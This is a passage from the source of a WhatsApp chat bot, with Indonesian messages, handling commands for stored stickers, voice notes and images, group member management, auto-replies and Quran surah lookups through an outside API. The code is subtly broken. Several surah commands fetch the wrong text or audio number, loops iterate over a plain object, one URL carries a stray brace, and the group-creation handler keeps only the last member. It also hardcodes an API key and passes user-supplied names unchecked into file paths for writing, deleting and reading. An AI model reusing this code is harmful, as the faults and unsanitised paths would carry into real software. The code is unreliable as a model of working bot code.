					sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/ssweb?url=${args[0]}&apikey=${HunterApi}`)
					break
				break
				case 'addsticker':
				if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
					if (!isQuotedSticker) return reply('Reply stiker')
					nm = body.slice(12)
					if (!nm) return reply('Nama sticker nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await wann.downloadMediaMessage(boij)
					setik.push(`${nm}`)
					fs.writeFileSync(`./media/sticker/${nm}.webp`, delb)
					fs.writeFileSync('./database/setik.json', JSON.stringify(setik))
					wann.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}liststicker*`, MessageType.text, { quoted: mek })
					break
				case 'delsticker':
				if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
					try {
					 nmm = body.slice(12)
					 wanu = setik.indexOf(nmm)
					 setik.splice(wanu, 1)
					 fs.unlinkSync(`./media/sticker/${nmm}.webp`)
					 reply(`Sukses menghapus sticker ${body.slice(12)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
				case 'stickerlist':
				case 'liststicker':
					teks = '*Sticker List :*\n\n'
					for (let awokwkwk of setik) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setik.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama sticker_`
					wann.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setik } })
					break
					case 'addvn':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
					if (!isQuotedAudio) return reply('Reply audio')
					nm = body.slice(7)
					if (!nm) return reply('Nama vn nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await wann.downloadMediaMessage(boij)
					vien.push(`${nm}`)
					fs.writeFileSync(`./media/vn/${nm}.mp3`, delb)
					fs.writeFileSync('./database/vien.json', JSON.stringify(vien))
					wann.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listvn*`, MessageType.text, { quoted: mek })
					break
					case 'delvn':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
					try {
					 nmm = body.slice(7)
					 wanu = vien.indexOf(nmm)
					 vien.splice(wanu, 1)
					 fs.unlinkSync(`./media/vn/${nmm}.mp3`)
					reply(`Sukses menghapus vn ${body.slice(7)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
				case 'vnlist':
				case 'listvn':
					teks = '*VN List :*\n\n'
					for (let awokwkwk of vien) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${vien.length}*\n\n_Untuk mengambil vn silahkan reply pesan ini dengan caption nama vn_`
					wann.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": vien } })
					break
				case 'addimage':
				if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
					if (!isQuotedImage) return reply('Reply image')
					nm = body.slice(10)
					if (!nm) return reply('Nama image nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await wann.downloadMediaMessage(boij)
					imagi.push(`${nm}`)
					fs.writeFileSync(`./media/image/${nm}.jpg`, delb)
					fs.writeFileSync('./database/imagi.json', JSON.stringify(imagi))
					wann.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listimage*`, MessageType.text, { quoted: mek })
					break
				case 'delimage':
				if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
					try {
					 nmm = body.slice(10)
					 wanu = imagi.indexOf(nmm)
					 imagi.splice(wanu, 1)
					 fs.unlinkSync(`./media/image/${nmm}.jpg`)
					 reply(`Sukses menghapus image ${body.slice(10)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break
					case 'imagelist':
				case 'listimage':
					teks = '*Image List :*\n\n'
					for (let awokwkwk of imagi) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagi.length}*\n\n_Untuk mengambil image silahkan reply pesan ini dengan caption nama image_`
					wann.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagi } })
					break
				case 'sticktag':
				if (!isGroup) return reply(mess.only.group)
				anu  = body.slice(10)
				wanu = anu.split('|')
				var group = await wann.groupMetadata(wanu[0])
				var member = group['participants']
				var mem = []
				member.map( async adm => {
				mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
				})
				result = fs.readFileSync(`./media/sticker/${wanu[1]}.webp`)
				wann.sendMessage(`${wanu[0]}`, result, sticker, { contextInfo: { "mentionedJid": mem }})
				break
			case 'runtime':
				runtime = process.uptime()
				reply(`Runtime : ${waktu(runtime)}`)
				break
			case 'setbio':
				if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
				if (args.length < 1) return reply('Teksnya?')
					iyek = body.slice(8)
					wann.setStatus(`${iyek}`)
					reply(`Sukses mengganti bio ke ${body.slice(8)}`)
					break
					case 'setname':
					if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
				if (args.length < 1) return reply('Teksnya?')
                anu = body.slice(9)
                wann.updateProfileName(anu)
                reply(`Sukses mengganti nama ke ${body.slice(9)}`)
                break
			case 'add':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
			add = mek.message.extendedTextMessage.contextInfo.participant
		    wann.groupAdd(from, [add])
				reply('Sukses menambahkan peserta')
				break
				case 'kick':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
			kick = mek.message.extendedTextMessage.contextInfo.participant
		    wann.groupRemove(from, [kick])
						reply('Sukses mengeluarkan peserta')
                    break
                    case 'creategroup':
			case 'creategrup':
			if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
				argz = arg.split('|')
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					wann.groupCreate(argz[0], anu)
					reply(`Sukses membuat grup ${argz[0]}`)
                }
				break
			case 'addrespon':
			if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
				if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
				argz = arg.split('|')
				if (checkCommands(argz[0], commandsDB) === true) return reply(`Udah ada`)
				addCommands(argz[0], argz[1], sender, commandsDB)
				reply(`Sukses menambahkan respon ${argz[0]}`)
				break
			case 'delrespon':
			if (!mek.key.fromMe && !isOwner && !isCoOwner) return reply(mess.only.ownerB)
				if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon hai`)
				if (!checkCommands(body.slice(11), commandsDB)) return reply(`Ga ada di database`)
                deleteCommands(body.slice(11), commandsDB)
				reply(`Sukses menghapus respon ${body.slice(11)}`)
				break
				case 'listrespon':
teks = `\`\`\`「 LIST RESPON  」\`\`\`\n\n`
for (let i = 0; i < commandsDB.length; i ++){
teks += `❏ *Tanya:* ${commandsDB[i].pesan}\n`
teks += `❏ *Balasan:* ${commandsDB[i].balasan}\n`
teks += `❏ *Creator:* ${commandsDB[i].creator}\n\n`
}
reply(teks)
break
case 'listsurah':
  reply(`Berikut ini Daftar Nomor Surah 
Untuk mencari ketik ${prefix}quran 1

1. Al-Fatihah الفاتحة
2. Al-Baqarah البقرة
3. Ali ‘Imran آل عمران
4. An-Nisa’ النّساء
5. Al-Ma’idah المآئدة
6. Al-An’am الانعام
7. Al-A’raf الأعراف
8. Al-Anfal الأنفال
9. At-Taubah التوبة
10. Yunus ينوس
11. Hud هود
12. Yusuf يسوف
13. Ar-Ra’d الرّعد
14. Ibrahim إبراهيم
15. Al-Hijr الحجر
16. An-Nahl النّحل
17. Al-Isra’ بني إسرائيل
18. Al-Kahf الكهف
19. Maryam مريم
20. Ta Ha طه
21. Al-Anbiya الأنبياء
22. Al-Hajj الحجّ
23. Al-Mu’minun المؤمنون
24. An-Nur النّور
25. Al-Furqan الفرقان
26. Asy-Syu’ara’ الشّعراء
27. An-Naml النّمل
28. Al-Qasas القصص
29. Al-‘Ankabut العنكبوت
30. Ar-Rum الرّوم
31. Luqman لقمان
32. As-Sajdah السّجدة
33. Al-Ahzab الْأحزاب
34. Saba’ سبا
35. Fatir فاطر
36. Ya Sin يس
37. As-Saffat الصّافات
38. Sad ص
39. Az-Zumar الزّمر
40. Al-Mu’min المؤمن
41. Fussilat فصّلت
42. Asy-Syura الشّورى
43. Az-Zukhruf الزّخرف
44. Ad-Dukhan الدّخان
45. Al-Jasiyah الجاثية
46. Al-Ahqaf الَأحقاف
47. Muhammad محمّد
48. Al-Fath الفتح
49. Al-Hujurat الحجرات
50. Qaf ق
51. Az-Zariyat الذّاريات
52. At-Tur الطّور
53. An-Najm النّجْم
54. Al-Qamar القمر
55. Ar-Rahman الرّحْمن
56. Al-Waqi’ah الواقعه
57. Al-Hadid الحديد
58. Al-Mujadilah المجادلة
59. Al-Hasyr الحشْر
60. Al-Mumtahanah الممتحنة
61. As-Saff الصّفّ
62. Al-Jumu’ah الجمعة
63. Al-Munafiqun المنافقون
64. At-Tagabun التّغابن
65. At-Talaq الطّلاق
66. At-Tahrim التّحريم
67. Al-Mulk الملك
68. Al-Qalam القلم
69. Al-Haqqah الحآقّة
70. Al-Ma’arij المعارج
71. Nuh نوح
72. Al-Jinn الجنّ
73. Al-Muzzammil المزمّل
74. Al-Muddassir المدشّر
75. Al-Qiyamah القيمة
76. Al-Insan الْاٍنسان
77. Al-Mursalat المرسلات
78. An-Naba’ النّبا
79. An-Nazi’at النّازعات
80. ‘Abasa عبس
81. At-Takwir التّكوير
82. Al-Infitar الانفطار
83. Al-Tatfif المطفّفين
84. Al-Insyiqaq الانشقاق
85. Al-Buruj البروج
86. At-Tariq الطّارق
87. Al-A’la الْأعلى
88. Al-Gasyiyah الغاشية
89. Al-Fajr الفجر
90. Al-Balad البلد
91. Asy-Syams الشّمس
92. Al-Lail الّيل
93. Ad-Duha الضحى
94. Al-Insyirah الانشراح
95. At-Tin التِّينِ
96. Al-‘Alaq العَلَق
97. Al-Qadr الْقَدْرِ
98. Al-Bayyinah الْبَيِّنَةُ
99. Az-Zalzalah الزلزلة
100. Al-‘Adiyat العاديات
101. Al-Qari’ah القارعة
102. At-Takasur التكاثر
103. Al-‘Asr العصر
104. Al-Humazah الهُمَزة
105. Al-Fil الْفِيلِ
106. Quraisy قُرَيْشٍ
107. Al-Ma’un الْمَاعُونَ
108. Al-Kausar الكوثر
109. Al-Kafirun الْكَافِرُونَ
110. An-Nasr النصر
111. Al-Lahab المسد
112. Al-Ikhlas الإخلاص
113. Al-Falaq الْفَلَقِ
114. An-Nas نَاسِ`)
break        
//===========================================================
case 'quran':

surah = body.slice(7)
anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=${surah}&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: ${surah}\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu) {
  quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}
lagu = await getBuffer(anu.audio)
wann.sendMessage(from, lagu, audio, {mimetype: 'audio/mp3', ptt:true})
reply(quran.trim())
break
case 'al-fatihah':
      anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=1&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 1\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu) {
  quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}
        buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/1?apikey=${settings.lolkey}`)
        reply(quran.trim())
        wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
       break
//===========================================================
case 'al-baqarah':
  anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=2&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 2\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

     buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/2?apikey=${settings.lolkey}`)
     reply(quran.trim())
     wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
     break
//===========================================================
case 'al-imran':
  anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=3&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 3\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

  buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/3?apikey=${settings.lolkey}`)
  reply(quran.trim())
  wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
  break
//===========================================================
case 'an-nisa':
  
  anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=4&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 4\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

  buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/4?apikey=${settings.lolkey}`)
  reply(quran.trim())
  wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
  break
//===========================================================
case 'al-maidah':

  anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=5&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 5\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

  buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/5?apikey=${settings.lolkey}`)
  reply(quran.trim())
  wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
//===========================================================
case 'al-anam':

                    anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=6&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 6\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
			       quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
			       \n================\n`}

                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/6?apikey=${settings.lolkey}`)
                    reply(quran.trim())
                    wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
                    break
//===========================================================
case 'al-araf':

  anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=7&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 7\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

  buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/7?apikey=${settings.lolkey}`)
  reply(quran.trim())
  wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
  break
//===========================================================
case 'al-anfal':

  anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=8&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 8\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

   buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/8?apikey=${settings.lolkey}`)
   reply(quran.trim())
   wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
   break
//===========================================================
case 'at-taubah':

                   anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=9&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 9\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/8?apikey=${settings.lolkey}`)
                    reply(quran.trim())
                    wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
                    break
//===========================================================
case 'yunus':

                    anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=10&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 10\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
			       quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/8?apikey=${settings.lolkey}`)
                    reply(quran.trim())
                    wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
                    break
//===========================================================
case 'hud':

  anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=11&apikey=WannOff`, {method: 'get'})
quran = `Surah Al-Qur\`an Nomor: 11\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
\n==========================\n`
for (let surah of anu) {
quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
\n================\n`}

  buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/11?apikey=${settings.lolkey}`)
  reply(quran.trim())
  wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
 break
//===========================================================
case 'yusuf':

                   anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=12&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 12\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/12?apikey=${settings.lolkey}`)
                    reply(quran.trim())
                    wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
                   break
//=============================================================
case 'ar-raad':

                   anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=13&apikey=WannOff}`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 13\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

                     buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/13?apikey=${settings.lolkey}`)
                     reply(quran.trim())
                     wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
                  break
 //===========================================================
 case 'ibrahim':

                   anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=14&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 14\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/14?apikey=${settings.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
 //===========================================================
 case 'al-hijr':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=15&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 15\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/15?apikey=${settings.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
 //===========================================================
 case 'an-nahl':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=15&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 16\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/16?apikey=${settings.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
 //===========================================================
 case 'al-isra':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=17&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 17\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/17?apikey=${settings.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
 //===========================================================
 case 'al-kahfi':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=18&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 18\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/17?apikey=${settings.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
 //===========================================================   
 case 'maryam':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=19&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 19\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/17?apikey=${settings.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break 
//===========================================================
case 'al-qariah':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=101&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 101\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/101?apikey=${settings.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
//===========================================================
case 'at-takasur':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=102&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 102\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/102?apikey=${settings.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
//===========================================================   
case 'al-ashr':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=103&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 103\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/103?apikey=${settings.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break   
//=========================================================== 
case 'al-humazah':
anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=104&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 104\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/104?apikey=${settings.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
//=========================================================== 
case 'al-fil':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=105&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 105\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/105?apikey=${settings.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
//=========================================================== 

case 'quraisy':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=106&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 106\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/106?apikey=${settings.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
//=========================================================== 
case 'al-maun':

anu = await fetchJson(`https://api.lolhuman.xyz/api/quran?no=107&apikey=WannOff`, {method: 'get'})
				   quran = `Surah Al-Qur\`an Nomor: 107\nSurah: ${anu.surah}\nDiturunkan Dikota: ${anu.type}\nJumlah Ayat: ${anu.jumlah_ayat}\n\n*${anu.ket}
				   \n==========================\n`
				   for (let surah of anu) {
					   quran += `${surah.number}\n${surah.text}\n${surah.translation_id}
				   \n================\n`}

buffer = await getBuffer(`http://api.lolhuman.xyz/api/quran/audio/107?apikey=${settings.lolkey}`)
reply(quran.trim())
wann.sendMessage(from, buffer, audio, {quoted: wan, mimetype: 'audio/mp4', ptt: true})
break
